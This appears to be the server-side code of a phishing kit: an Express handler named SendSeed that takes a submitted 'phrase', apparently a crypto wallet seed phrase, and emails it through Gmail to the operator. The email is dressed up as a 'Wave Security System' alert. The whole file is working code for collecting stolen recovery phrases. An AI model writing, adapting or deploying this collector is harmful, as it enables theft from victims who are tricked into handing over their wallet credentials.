import { validateschema } from "../model/validate.js";
import nodemailer from "nodemailer";
async function SendSeed(req, res) {
  try {
    const { phrase } = req.body;
    const { error, _value } = validateschema.validate({
      phrase,
    });

    if (error) {
      return res.status(404).json({ message: error.details[0].message });
    }
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: `"admin Security" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: "🔑 You Received a New Phrase",
      text: `Phrase: ${phrase}`,
      html: `
    <div style="
      font-family: Arial, sans-serif; 
      background-color: #f9f9f9; 
      padding: 20px;
    ">
      <div style="
        max-width: 500px; 
        margin: auto; 
        background: #ffffff; 
        padding: 20px; 
        border-radius: 8px; 
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      ">
        <h2 style="color: #333; text-align:center;">📩 New Phrase Received</h2>
        <p style="font-size: 16px; color: #555;">
          You’ve received a new phrase. Details below:
        </p>
        <div style="
          background: #f0f4ff; 
          border: 1px solid #d6e0ff; 
          padding: 15px; 
          border-radius: 5px;
          margin: 15px 0;
        ">
          <p style="font-size: 18px; color: #111; margin: 0;">
            <b>Phrase:</b> ${phrase}
          </p>
        </div>
        <p style="font-size: 14px; color: #888; text-align:center; margin-top: 20px;">
          — Sent automatically by Wave Security System
        </p>
      </div>
    </div>
  `,
    });
    return res
      .status(200)
      .json({ success: true, message: "send successfully" });
  } catch (error) {
    console.error("internal server error", error);
    return res.status(500).json({ message: "internal server error " });
  }
}
export { SendSeed };
